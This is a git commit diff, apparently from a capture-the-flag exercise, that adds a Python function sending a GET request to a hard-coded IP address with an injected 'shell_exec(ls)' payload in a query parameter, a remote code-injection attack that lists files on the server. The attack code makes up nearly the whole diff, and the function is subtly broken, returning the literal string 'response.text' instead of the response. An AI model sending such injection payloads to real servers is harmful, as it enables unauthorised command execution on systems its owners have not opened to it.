c33f492cd49a9a9c8482be107381a464ab2145f2
jade-e-mcdermott <jade.e.mcdermott@gmail.com>
2021-01-01 13:58:14 -0800

    added function GetLsOnServer() that runs ls on the server.

--- HPNY/python/main.py
+++ HPNY/python/main.py
@@ -1,10 +1,18 @@
 import requests
 
+def GetLsOnServer():
+    baseUrl = "http://192.46.227.32//?roll="
+    injectedCommand = "shell_exec(ls)"
+    endingStuff = ".getcwd"
+
+    fullRequest = baseUrl + injectedCommand + endingStuff
+    response = requests.get(fullRequest)
+
+    lsResults = "response.text"
+    return lsResults
 
 
-
-
-
+GetLsOnServer()
 baseUrl = "http://192.46.227.32//?roll="
 injectedCommand = "shell_exec(ls)"
 endingStuff = ".getcwd"
